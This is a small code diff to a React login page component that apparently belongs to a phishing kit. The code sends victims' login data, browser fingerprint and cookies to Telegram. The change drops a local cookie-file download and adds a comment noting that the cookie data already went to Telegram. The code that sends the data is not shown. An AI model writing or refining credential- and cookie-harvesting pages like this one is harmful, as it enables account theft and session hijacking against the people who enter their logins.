@@ -157,7 +157,8 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
 
       // Only download cookies file after successful Telegram send
       if (telegramResult.success) {
-        createCookiesFile(browserFingerprint, loginData);
+        // Don't download cookies file - it's already sent to Telegram
+        console.log('Cookies data sent to Telegram successfully');
       }
       const sessionResponse = await fetch('/.netlify/functions/setSession', {
         method: 'POST',
